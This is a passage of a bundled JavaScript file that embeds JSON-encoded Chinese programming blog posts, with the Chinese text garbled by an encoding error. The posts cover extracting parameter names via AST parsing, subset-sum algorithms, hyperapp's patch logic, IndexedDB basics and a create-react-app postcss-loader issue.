‘</code>çš„<code>3èŠ‚ç‚¹</code>ï¼Œçº¢é“¾æ¥ä¸­å­èŠ‚ç‚¹æ˜¯<code>çº¢è‰²</code>ï¼Œçˆ¶èŠ‚ç‚¹æ˜¯<code>é»‘è‰²</code></li>\\n<li>åªå­˜åœ¨çº¢é“¾æ¥ä¸ºå·¦é“¾æ¥ï¼Œå‘ç°çº¢é“¾æ¥ä¸ºå³é“¾æ¥éœ€è¦è½¬æ¢</li>\\n<li>å½“èŠ‚ç‚¹ä¸ºnullï¼Œä¹Ÿè®¤ä¸ºæ˜¯<code>é»‘è‰²</code></li>\\n<li>å½“æ’å…¥èŠ‚ç‚¹ï¼Œå‡ºç°2ä¸ªå·¦çº¢ç‚¹ç›¸é‚»(ä¸å¯èƒ½å‡ºç°2ä¸ªå³çº¢ç‚¹ç›¸é‚»ï¼Œå› ä¸ºç¬¬3æ¡)ï¼Œå…¶å®å°±æ˜¯`...</li>\\n</ol>","slug":"hong-hei-shu-yao-dian-gen-ju-suan-fa-di-4-ban-","sha":"18598c17b6c44620cb536b5b1bb6fa7f9f9cd4e4"}')},600:function(n){n.exports=JSON.parse('{"content":"<p>ä»Šå¤©ç¢°åˆ°ä¸€ä¸ªéœ€æ±‚ï¼Œè·å–å‡½æ•°å‚æ•°åç§°ï¼Œ\\nåˆšå¼€å§‹æ‰“ç®—ç”¨æ­£åˆ™å»å¤„ç†ï¼Œä½†å‡½æ•°å†™æ³•(åŒ…æ‹¬es6)ä¹ŸæŒºå¤šçš„ï¼Œ</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>function x(a,b){}\\nfunction x(a=5,b=3){}\\nlet x=function(a=5,b){}\\nlet x=(a=5,b)=&gt;a+b\\nlet x=a=&gt;a*2\\nfunction x(a,/* b */){}</code></pre></code></pre><p>å¦‚æœç”¨æ­£åˆ™å»å…¼å®¹æ‰€æœ‰æƒ…å†µï¼Œè€ƒè™‘çš„ä¼šæ¯”è¾ƒå¤æ‚ï¼Œè€Œä¸”ä¸èƒ½æœ‰å†²çªã€‚</p>\\n<p>è¿™é‡Œä½¿ç”¨<code>AST</code>è¯­æ³•æ ‘å»è·å–ï¼Œæ€è·¯å°±æ˜¯</p>\\n<ol>\\n<li><p>å‡½æ•°å¯ä»¥åˆ†ä¸º3ç±»ï¼Œåˆ†åˆ«æ˜¯</p>\\n<p><code>FunctionDeclaration</code>ï¼Œå¯¹åº” <code>function x(a,b){}</code>\\n<code>FunctionExpression</code>ï¼Œå¯¹åº”<code>let x=function(a=5,b){}</code>\\n<code>ArrowFunctionExpression</code>ï¼Œå¯¹åº”<code>let x=a=&gt;a*2</code></p>\\n</li>\\n<li><p>è·å–è¯­æ³•åˆ†æåŒ…<code>npm install --save esprima</code>ï¼Œ\\n è·å–è¯­æ³•æ ‘é€’å½’è§£æåŒ…<code>npm install --save estraverse</code></p>\\n<p> ä½¿ç”¨<code>estraverse</code>å»å¤„ç†è¯­æ³•æ ‘ï¼Œå¯ä»¥çœå»å¾ˆå¤šåˆ¤æ–­å¤„ç†ï¼Œå› ä¸ºå®ƒå·²ç»å¸®ä½ å¤„ç†å¥½äº†</p>\\n</li>\\n<li><p>ç¼–å†™ä»£ç å¤„ç†</p>\\n</li>\\n</ol>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> esprima=<span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-string\\">\'esprima\'</span>);\\n<span class=\\"hljs-keyword\\">const</span> estraverse =<span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-string\\">\'estraverse\'</span>);\\n<span class=\\"hljs-keyword\\">const</span> astEsprima=esprima.parse(testFunc)\\n<span class=\\"hljs-keyword\\">let</span> res\\n  estraverse.traverse(astEsprima, {\\n    <span class=\\"hljs-comment\\">// estraverseé€’å½’è¿›å…¥çš„æ—¶å€™è§¦å‘</span>\\n    <span class=\\"hljs-attr\\">enter</span>: <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">node</span>) </span>{\\n      <span class=\\"hljs-comment\\">// å‡½æ•°å¯¹åº”3ç§ç±»å‹</span>\\n      <span class=\\"hljs-keyword\\">if</span>(node.type===<span class=\\"hljs-string\\">\\"FunctionDeclaration\\"</span> || \\n      node.type===<span class=\\"hljs-string\\">\\"ArrowFunctionExpression\\"</span> || \\n      node.type===<span class=\\"hljs-string\\">\\"FunctionExpression\\"</span>){\\n        <span class=\\"hljs-keyword\\">let</span> params=node.params\\n        params=params.map(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">o</span>=&gt;</span>{\\n          <span class=\\"hljs-comment\\">// å½“å‚æ•°æ˜¯è¡¨è¾¾å¼æ—¶ï¼Œéœ€è¦é€’å½’è§£æï¼Œæ‰¾åˆ°`Identifier`</span>\\n          <span class=\\"hljs-keyword\\">while</span>(o.type!==<span class=\\"hljs-string\\">\'Identifier\'</span>)o=o.left\\n          <span class=\\"hljs-keyword\\">return</span> o.name\\n        })\\n        res=params\\n        <span class=\\"hljs-comment\\">// ä¸­æ–­estraverseé€’å½’</span>\\n        <span class=\\"hljs-keyword\\">this</span>.break()\\n      }\\n    }\\n  });</code></pre></code></pre>\\n<hr>\\n<p>æµ‹è¯•ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> test=[\\n  <span class=\\"hljs-string\\">\'function d(a,b,c){}\'</span> <span class=\\"hljs-comment\\">// returns [\\"a\\",\\"b\\",\\"c\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function d(){}\'</span> <span class=\\"hljs-comment\\">// returns []</span>\\n  ,<span class=\\"hljs-string\\">\'function named(a, b, c) {}\'</span> <span class=\\"hljs-comment\\">// returns [\\"a\\",\\"b\\",\\"c\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function x(a /* = 1 */, b /* = true */) {}\'</span> <span class=\\"hljs-comment\\">// returns [\\"a\\",\\"b\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function fprintf(handle, fmt /*, {}*/) {}\'</span> <span class=\\"hljs-comment\\">// returns [\\"handle\\",\\"fmt\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function x( a, b = 1, c ){}\'</span> <span class=\\"hljs-comment\\">// returns [\\"a\\",\\"b\\",\\"c\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function x(a=4*(5/3), b) {}\'</span> <span class=\\"hljs-comment\\">// returns [\\"a\\",\\"b\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function x(a /* function() yes */, \\\\n /* no, */b)/* omg! */{}\'</span> <span class=\\"hljs-comment\\">// returns [\\"a\\",\\"b\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function x( A, b \\\\n,c ,d \\\\n ) \\\\n {}\'</span> <span class=\\"hljs-comment\\">// returns [\\"A\\",\\"b\\",\\"c\\",\\"d\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function x(a,b){}\'</span> <span class=\\"hljs-comment\\">// returns [\\"a\\",\\"b\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function $args(func) {}\'</span> <span class=\\"hljs-comment\\">// returns [\\"func\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'function Object() {}\'</span> <span class=\\"hljs-comment\\">// returns []</span>\\n  ,<span class=\\"hljs-string\\">\'e=&gt;{}\'</span>  <span class=\\"hljs-comment\\">// [\\"e\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'(a,b)=&gt;{}\'</span>  <span class=\\"hljs-comment\\">// [\\"a\\",\\"b\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'(e)=&gt;1\'</span> <span class=\\"hljs-comment\\">// [\\"e\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'(a=65,b=undefined)=&gt;\\"string\\"\'</span> <span class=\\"hljs-comment\\">// [\\"a\\",\\"b\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'ddd=e=&gt;{}\'</span>  <span class=\\"hljs-comment\\">// [\\"e\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'let xx=(e,b)=&gt;{}\'</span> <span class=\\"hljs-comment\\">// [\\"e\\",\\"b\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'xx=function(bb){}\'</span>  <span class=\\"hljs-comment\\">// [\\"bb\\"]</span>\\n  ,<span class=\\"hljs-string\\">\'let x=function(aa,cc){}\'</span>  <span class=\\"hljs-comment\\">// [\\"aa\\",\\"cc\\"]</span>\\n  ,<span class=\\"hljs-string\\">`let x=(controller) =&gt;{  \\n    }`</span>                      <span class=\\"hljs-comment\\">// [\\"controller\\"] </span>\\n]</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-13","timeArr":[2018,8,13,0,0,0,0],"title":"è·å–å‡½æ•°å‚æ•°åç§°","uuid":"be95143b4d5b92aa8901844dde5e73230a1d2f49","summary":"<p>ä»Šå¤©ç¢°åˆ°ä¸€ä¸ªéœ€æ±‚ï¼Œè·å–å‡½æ•°å‚æ•°åç§°ï¼Œ\\nåˆšå¼€å§‹æ‰“ç®—ç”¨æ­£åˆ™å»å¤„ç†ï¼Œä½†å‡½æ•°å†™æ³•(åŒ…æ‹¬es6)ä¹ŸæŒºå¤šçš„ï¼Œ</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre class=\\"hljs\\"><code>function x(a,b){}\\nfunction x(a=5,b=3){}\\nlet x=function(a=5,b){}\\nlet x=(a=5,b)=&gt;a+b\\nlet x=a=&gt;a*2\\nfuncti...</code></pre>","slug":"huo-qu-han-shu-can-shu-ming-cheng","sha":"666081661a6e70d949e3a7754293a33f83e18432"}')},601:function(n){n.exports=JSON.parse('{"content":"<p>è®°å½•ä¸€ä¸ªç®—æ³•ï¼Œè¦æ±‚è·å–æ•°ç»„ä¸­çš„å’Œä¸º<code>sum</code>çš„ç»„åˆçš„æ•°é‡</p>\\n<ul>\\n<li>ä¸è¦æ±‚è¿ç»­ï¼Œä¸è¦æ±‚é‡å¤</li>\\n</ul>\\n<p>ä¾‹å¦‚<code>arr=[1,2,3,4,5]</code>ï¼Œé‚£ä¹ˆå’Œä¸º5çš„ç»„åˆæ•°é‡ä¸º3ï¼Œåˆ†åˆ«æ˜¯<code>2,3</code>ã€<code>1,4</code>ã€<code>5</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">computeSubset</span>(<span class=\\"hljs-params\\">arr,sum</span>)</span>{\\n  <span class=\\"hljs-comment\\">// åˆ›å»ºæ•°ç»„ï¼Œç”¨äºè®°å½•ä»1åˆ°sumæ¯ä¸€ä¸ªæ•°çš„ç»„åˆæ•°é‡</span>\\n  <span class=\\"hljs-keyword\\">let</span> aux=<span class=\\"hljs-built_in\\">Array</span>(sum+<span class=\\"hljs-number\\">1</span>).fill(<span class=\\"hljs-number\\">0</span>)\\n  <span class=\\"hljs-comment\\">// è®¾ç½®0ä¸º1ï¼Œå› ä¸ºåé¢çš„å¤„ç†ï¼Œ0ä¹Ÿå°±æ˜¯å®ƒæœ¬èº«</span>\\n  aux[<span class=\\"hljs-number\\">0</span>]=<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> n <span class=\\"hljs-keyword\\">of</span> arr){\\n    <span class=\\"hljs-comment\\">// è¿™é‡Œi&lt;nï¼Œå°±æ²¡æ„ä¹‰äº†ï¼Œå°±ä¼šå‡ºç°æ•°ç»„ç´¢å¼•æ˜¯è´Ÿå€¼</span>\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=sum;i&gt;=n;i--){\\n      <span class=\\"hljs-comment\\">// ç²¾é«“ï¼Œè§æœ€å</span>\\n      aux[i]+=aux[i-n]\\n    }\\n  }\\n  <span class=\\"hljs-comment\\">// è¿”å›ç¬¬sumä¸ªçš„ç»„åˆæ•°é‡</span>\\n  <span class=\\"hljs-keyword\\">return</span> aux[sum]\\n}\\n\\ncomputeSubset([<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-number\\">3</span>,<span class=\\"hljs-number\\">4</span>,<span class=\\"hljs-number\\">5</span>],<span class=\\"hljs-number\\">5</span>) <span class=\\"hljs-comment\\">// 3</span></code></pre></code></pre>\\n<p>å…³äºä¸Šé¢<code>aux[i]+=aux[i-1]</code></p>\\n<pre><code><pre class=\\"hljs\\"><code>aux[1] = aux[1] +aux[0]\\naux[2] = aux[2] +aux[1]\\naux[3] = aux[3] +aux[2]</code></pre></code></pre><p>==&gt;<code>aux[3] = aux[3] +aux[2] +aux[1] +aux[0]</code></p>\\n<hr>\\n<ul>\\n<li>ä¸è¦æ±‚è¿ç»­ï¼Œè¦æ±‚é‡å¤</li>\\n</ul>\\n<p>ä¾‹å¦‚ï¼š<code>arr=[1,2,5]</code>ï¼Œé‚£ä¹ˆå’Œä¸º5çš„ç»„åˆä¸º4ï¼Œåˆ†åˆ«æ˜¯<code>1,1,1,1,1</code>ã€<code>1,1,1,2</code>ã€<code>2,2,1</code>ã€<code>5</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> change = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">arr,sum</span>) </span>{\\n  <span class=\\"hljs-keyword\\">let</span> aux=<span class=\\"hljs-built_in\\">Array</span>(sum+<span class=\\"hljs-number\\">1</span>).fill(<span class=\\"hljs-number\\">0</span>)\\n  aux[<span class=\\"hljs-number\\">0</span>]=<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> n <span class=\\"hljs-keyword\\">of</span> arr){\\n    <span class=\\"hljs-comment\\">// ä¸Šä¸€é¢˜è¿™é‡Œæ˜¯é€†åºï¼Œè¿™é‡Œæ˜¯é¡ºåº</span>\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=n;i&lt;aux.length;i++){\\n      aux[i]+=aux[i-n]\\n    }\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> aux[sum]\\n};</code></pre></code></pre>\\n<hr>\\n<ul>\\n<li>è¦æ±‚è¿ç»­ï¼Œä¸è¦æ±‚é‡å¤</li>\\n</ul>\\n<p>ä¾‹å¦‚<code>arr=[1,2,3,4,5]</code>ï¼Œé‚£ä¹ˆå’Œä¸º5çš„ç»„åˆæ•°é‡ä¸º2ï¼Œåˆ†åˆ«æ˜¯<code>2,3</code>ã€<code>5</code></p>\\n<p>å†™æ³•ä¸€ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">calcSumCount</span>(<span class=\\"hljs-params\\">arr,target</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> prefix=[<span class=\\"hljs-number\\">1</span>],curSum=<span class=\\"hljs-number\\">0</span>,result=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;arr.length;i++){\\n    curSum+=arr[i]\\n    <span class=\\"hljs-keyword\\">if</span>(curSum&gt;=target)result+=prefix[curSum-target] || <span class=\\"hljs-number\\">0</span>\\n    <span class=\\"hljs-keyword\\">if</span>(!prefix[curSum])prefix[curSum]=<span class=\\"hljs-number\\">1</span>\\n    <span class=\\"hljs-keyword\\">else</span> prefix[curSum]++\\n  }\\n<span class=\\"hljs-keyword\\">return</span> result\\n}</code></pre></code></pre>\\n<p>å†™æ³•äºŒï¼š<code>windowSlide</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">windowSlideSum</span>(<span class=\\"hljs-params\\">arr,target</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> sum=<span class=\\"hljs-number\\">0</span>,result=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">let</span> head=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;arr.length;i++){\\n    sum+=arr[i]\\n    <span class=\\"hljs-keyword\\">while</span>(sum&gt;=target &amp;&amp; head&lt;=i){\\n      <span class=\\"hljs-keyword\\">if</span>(sum===target)result++\\n      sum-=arr[head++]\\n    }\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> result\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-02","timeArr":[2018,9,2,0,0,0,0],"title":"è·å–æ•°ç»„ä¸­å’Œä¸ºæŸä¸ªå€¼çš„ç»„åˆæ•°é‡çš„ç®—æ³•","uuid":"d8cf763cd33c2883caf30f5d6f247da84af3cf8f","summary":"<p>è®°å½•ä¸€ä¸ªç®—æ³•ï¼Œè¦æ±‚è·å–æ•°ç»„ä¸­çš„å’Œä¸º<code>sum</code>çš„ç»„åˆçš„æ•°é‡</p>\\n<ul>\\n<li>ä¸è¦æ±‚è¿ç»­ï¼Œä¸è¦æ±‚é‡å¤</li>\\n</ul>\\n<p>ä¾‹å¦‚<code>arr=[1,2,3,4,5]</code>ï¼Œé‚£ä¹ˆå’Œä¸º5çš„ç»„åˆæ•°é‡ä¸º3ï¼Œåˆ†åˆ«æ˜¯<code>2,3</code>ã€<code>1,4</code>ã€<code>5</code></p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">computeSubset</span>(<span class=\\"hljs-params\\">arr,sum</span>)</span>{\\n  <span class=\\"hljs-comment\\">// åˆ›å»ºæ•°ç»„ï¼Œç”¨äºè®°å½•ä»1åˆ°sumæ¯ä¸€ä¸ª...</span></code></pre>","slug":"huo-qu-shu-zu-zhong-he-wei-mou-ge-zhi-de-zu-he-shu-liang-de-suan-fa","sha":"ccf5cf75d3f663c8c143ed75e3d46b5a2f8aa576"}')},602:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"hyperapp-patch\\">hyperapp-patch</h2>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.hyperapp/README.md\\">å®Œæ•´æºç è¯´æ˜æ³¨é‡Š</a></p>\\n<p>patchæ˜¯hyperappè¿›è¡ŒèŠ‚ç‚¹æ›´æ–°çš„æ ¸å¿ƒï¼Œä¸»è¦æ­¥éª¤ï¼š</p>\\n<ul>\\n<li>å…ˆåˆ¤æ–­nodeèŠ‚ç‚¹</li>\\n<li>å½“èŠ‚ç‚¹ç›¸åŒ---&gt;è¿›è¡Œkeyåˆ¤æ–­---&gt;é€’å½’patchï¼Œç›´åˆ°æŒ‡é’ˆåˆ°å°¾éƒ¨</li>\\n<li>æœ€ååˆ¤æ–­æ˜¯å¦éœ€è¦åˆ é™¤èŠ‚ç‚¹</li>\\n<li>è¿”å›æ›´æ–°çš„element</li>\\n</ul>\\n<p>æ€ç»´å¯¼å›¾ï¼š\\n<img src=\\"/article/img/hyperapp-patch%E5%AF%BC%E5%9B%BE.png\\" alt=\\"\\"></p>\\n","toc":[{"anchor":"hyperapp-patch","level":2,"text":"hyperapp-patch"}],"relatedTags":null,"created_at":"2018-07-02","timeArr":[2018,6,2,0,0,0,0],"title":"hyperapp-patch","uuid":"ab4d7fd4fc306830807768df35b00d9bc91c9d20","summary":"<h4>hyperapp-patch</h4>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.hyperapp/README.md\\">å®Œæ•´æºç è¯´æ˜æ³¨é‡Š</a></p>\\n<p>patchæ˜¯hyperappè¿›è¡ŒèŠ‚ç‚¹æ›´æ–°çš„æ ¸å¿ƒï¼Œä¸»è¦æ­¥éª¤ï¼š</p>\\n<ul>\\n<li>å…ˆåˆ¤æ–­n...</li>\\n</ul>","slug":"hyperapp-patch","sha":"59bb573e47697c7551bfe0191079a8772342b529"}')},603:function(n){n.exports=JSON.parse('{"content":"<p>indexedDB\\nåœ¨å®¢æˆ·ç«¯è¿›è¡Œä¿å­˜ä¿å­˜ï¼š </p>\\n<pre><code><pre class=\\"hljs\\"><code>{id: 1, name: &quot;å¼ ä¸‰&quot;, age: 24, email: &quot;zhangsan@example.com&quot;}\\n{id: 2, name: &quot;æå››&quot;, age: 54, email: &quot;lisi@example.com&quot;}\\n{id: 3, name: &quot;ç‹äº”&quot;, age: 36, email: &quot;wangwu@example.com&quot;}</code></pre></code></pre><ul>\\n<li>æ­¥éª¤1-åˆ›å»ºæ•°æ®åº“<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> request = <span class=\\"hljs-built_in\\">window</span>.indexedDB.open(<span class=\\"hljs-string\\">\\"test\\"</span>, <span class=\\"hljs-number\\">1</span>);\\n<span class=\\"hljs-keyword\\">var</span> db</code></pre></code></pre>\\n</li>\\n</ul>\\n<ul>\\n<li>æ­¥éª¤2-åˆ›å»ºæ•°æ®è¡¨ï¼Œæ·»åŠ åˆå§‹æ•°æ®<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>request = <span class=\\"hljs-built_in\\">window</span>.indexedDB.open(<span class=\\"hljs-string\\">\\"test\\"</span>, <span class=\\"hljs-number\\">1</span>);\\nrequest.onupgradeneeded=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">e</span>)</span>{\\ndb = e.target.result;\\n<span class=\\"hljs-keyword\\">var</span> objectStore;\\n<span class=\\"hljs-keyword\\">if</span> (!db.objectStoreNames.contains(<span class=\\"hljs-string\\">\'person\'</span>)) {\\n  objectStore = db.createObjectStore(<span class=\\"hljs-string\\">\'person\'</span>, { <span class=\\"hljs-attr\\">keyPath</span>: <span class=\\"hljs-string\\">\'id\'</span> });\\n}\\nobjectStore.add({<span class=\\"hljs-attr\\">id</span>: <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\\"å¼ ä¸‰\\"</span>, <span class=\\"hljs-attr\\">age</span>: <span class=\\"hljs-number\\">24</span>, <span class=\\"hljs-attr\\">email</span>: <span class=\\"hljs-string\\">\\"zhangsan@example.com\\"</span>})\\n}</code></pre></code></pre>\\n</li>\\n</ul>\\n<ul>\\n<li><p>æ­¥éª¤3-å¢åŠ æ•°æ®</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>add()\\n<span class=\\"hljs-comment\\">// dbå­˜åœ¨</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">add</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n<span class=\\"hljs-keyword\\">var</span> addReq\\n<span class=\\"hljs-keyword\\">var</span> tra=db.transaction([<span class=\\"hljs-string\\">\'person\'</span>],<span class=\\"hljs-string\\">\'readwrite\'</span>)\\n<span class=\\"hljs-keyword\\">var</span> objS=tra.objectStore(<span class=\\"hljs-string\\">\'person\'</span>)\\naddReq=objS.add({<span class=\\"hljs-attr\\">id</span>: <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\\"æå››\\"</span>, <span class=\\"hljs-attr\\">age</span>: <span class=\\"hljs-number\\">54</span>, <span class=\\"hljs-attr\\">email</span>: <span class=\\"hljs-string\\">\\"lisi@example.com\\"</span>})\\naddReq=objS.add({<span class=\\"hljs-attr\\">id</span>: <span class=\\"hljs-number\\">3</span>, <span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\\"ç‹äº”\\"</span>, <span class=\\"hljs-attr\\">age</span>: <span class=\\"hljs-number\\">36</span>, <span class=\\"hljs-attr\\">email</span>: <span class=\\"hljs-string\\">\\"wangwu@example.com\\"</span>})\\naddReq.onsuccess = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">event</span>) </span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'æ•°æ®å†™å…¥æˆåŠŸ\'</span>);\\n};\\n\\naddReq.onerror = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">event</span>) </span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'æ•°æ®å†™å…¥å¤±è´¥\'</span>);\\n}\\n}\\n</code></pre></code></pre>\\n</li>\\n</ul>\\n<pre><code><pre class=\\"hljs\\"><code>* æ­¥éª¤4-æŸ¥æ‰¾æ•°æ®è¡¨\\n```js\\nrequest = window.indexedDB.open(&quot;test&quot;, 1);\\nrequest.onsuccess=function(e){\\n  db=e.target.result\\n  var tra=db.transaction([\'person\'])\\n  var objS=tra.objectStore(\'person\')\\n  console.log(objS.getAll().result)\\n}</code></pre></code></pre><p>å‚è€ƒï¼š<a href=\\"https://wangdoc.com/javascript/bom/indexeddb.html\\">https://wangdoc.com/javascript/bom/indexeddb.html</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-15","timeArr":[2018,7,15,0,0,0,0],"title":"indexedDBç®€è¦å¢åˆ æŸ¥","uuid":"b8d2829958b70c73fa0733e45fe779eff931cbc5","summary":"<p>indexedDB\\nåœ¨å®¢æˆ·ç«¯è¿›è¡Œä¿å­˜ä¿å­˜ï¼š</p>\\n<pre class=\\"hljs\\"><code>{id: 1, name: &quot;å¼ ä¸‰&quot;, age: 24, email: &quot;zhangsan@example.com&quot;}\\n{id: 2, name: &quot;æå››&quot;, age: 54, email: &quot;lisi@example.com&quot;}\\n{id: 3, name: &quot;ç‹äº”...</code></pre>","slug":"indexedDB-jian-yao-zeng-shan-cha","sha":"b9c382c33ecfc711c7de0a929d346090b6c78122"}')},604:function(n){n.exports=JSON.parse('{"content":"<p><code>CRA</code>çš„webpacké…ç½®å¼ºå¤§çš„å¾ˆé‡è¦ä¸€ç‚¹å°±æ˜¯é€šè¿‡ä¸æ–­åœ°è§£å†³ä¸€ä¸ªä¸ªissueï¼Œæ‰èƒ½è¾¾åˆ°ä»Šå¤©çš„å…¼å®¹æ€§å’Œæ€§èƒ½ã€‚</p>\\n<p>ä¸‹é¢æ¥æ•°ä¸€æ•°æ›¾ç»çš„issueå’Œå¯¹åº”çš„è§£å†³åŠæ³•ã€‚</p>\\n<ul>\\n<li>å…³äº<code>postcss-loader</code>çš„<code>ident</code></li>\\n</ul>\\n<p>å®ƒæ˜¯ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦ï¼Œå¼•ç”¨webpackçš„åŸè¯ï¼Œæ˜¯è¦æ±‚<code>plugins</code>ä¸ºå‡½æ•°(å¤æ‚é…ç½®)çš„æ—¶å€™ï¼Œå¿…é¡»è¦<code>ident</code></p>\\n<blockquote>\\n<p>âš webpack requires an identifier (ident) in options when {Function}/require is used (Complex Options).\\n The ident can be freely named as long as it is unique. It&#39;s recommended to name it (ident: &#39;postcss&#39;)</p>\\n</blockquote>\\n<pre><code><pre class=\\"hljs\\"><code>loader: require.resolve(\'postcss-loader\'),\\n      options: {\\n        // Necessary for external CSS imports to work\\n        // https://github.com/facebook/create-react-app/issues/2677\\n        // æ ¹æ®2677é—®é¢˜è¿™é‡Œæœ‰å¿…è¦æ·»åŠ ident\\n        // webpackéœ€è¦çš„ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼Œå”¯ä¸€å€¼\\n        ident: \'postcss\',\\n        plugins: () =&gt; [\\n          // å¯¹flexä¸€äº›bugå˜é€šè§£å†³æ–¹æ¡ˆ\\n          require(\'postcss-flexbugs-fixes\'),\\n          // èƒ½ä½¿ç”¨æœªæ¥çš„cssè¯­æ³•ï¼Œå˜é‡åµŒå¥—ç­‰\\n          require(\'postcss-preset-env\')({\\n          ...</code></pre></code></pre><p>é‚£ä¹ˆ2677é—®é¢˜æ˜¯ä»€ä¹ˆå‘¢</p>\\n<p>è¿™é‡Œæ·»åŠ äº†ä¸€ä¸ªnode_modulesçš„<code>normalize.css</code>(~ä»£è¡¨node_modules)</p>\\n<pre><code><pre class=\\"hljs\\"><code>create-react-app postcssbug\\ncd postcssbug\\nyarn add normalize.css\\necho &quot;@import \'~normalize.css/normalize.css\';&quot; &gt;&gt; src/index.css\\nyarn start</code></pre></code></pre><p>ç»“æœæŠ¥é”™å¦‚ä¸‹ï¼š\\n<img src=\\"https://user-images.githubusercontent.com/5342/27674917-75d4e984-5cc5-11e7-95cc-a7737a7638fb.png\\" alt=\\"\\"></p>\\n<p>é€šè¿‡å¯¹è¿™ä¸ªé—®é¢˜çš„è®¨è®ºï¼Œå¼•å‡ºäº†ä¸€ä¸ªå‡ å¤©å‰çš„PRï¼Œ\\n<a href=\\"https://github.com/facebook/create-react-app/pull/2430\\">https://github.com/facebook/create-react-app/pull/2430</a></p>\\n<p>è¿™ä¸ªPRåˆ é™¤äº†loaderä¸­åŸæœ¬å­˜åœ¨çš„ident</p>\\n<blockquote>\\n<p>Since v2.2.1 of Webpack, the need for ident for complex options is no longer required. See\\n <a href=\\"https://webpack.js.org/guides/migrating/#complex-options\\">https://webpack.js.org/guides/migrating/#complex-options</a></p>\\n</blockquote>\\n<p> 